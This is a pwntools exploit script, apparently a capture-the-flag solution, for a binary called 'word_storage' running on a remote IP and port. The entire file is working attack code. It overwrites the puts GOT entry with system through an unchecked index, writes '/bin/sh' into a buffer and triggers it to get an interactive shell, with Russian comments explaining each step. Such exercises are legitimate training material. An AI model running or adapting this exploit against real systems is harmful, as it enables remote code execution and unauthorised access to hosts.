#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./word_storage.elf --host 109.233.56.90 --port 11671
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./word_storage.elf')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11671)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()


buf_addr   = 0x4040A0
puts_got   = 0x404020
index      = (puts_got - buf_addr) // 8

libc_base  = 0x7ffff7de3000
sys_addr   = libc_base + 0x48F20


# сначала перезаписываем puts в got на system
io.recvuntil(b'> ')
io.send(b'1\n')
io.recvuntil(b'index: ')
io.send(str(index).encode() + b'\n') # перезапишем puts в .got.plt
io.recvuntil(b'word: ')
io.send(p64(sys_addr) + b'\n')

# потом в наш буфер пишем b'/bin/sh'
io.recvuntil(b'> ')
io.send(b'1\n')
io.recvuntil(b'index: ')
io.send(b'0\n')
io.recvuntil(b'word: ')
io.send(b'/bin/sh\n')

# потом читаем из нашего буфера
io.recvuntil(b'> ')
io.send(b'2\n')
io.recvuntil(b'index: ')
io.send(b'0\n')
# прога вызовет puts c аргументом /bin/sh, но вместо puts в got'e лежит адрес system
# соотвественно выполнится system("/bin/sh")

io.interactive()

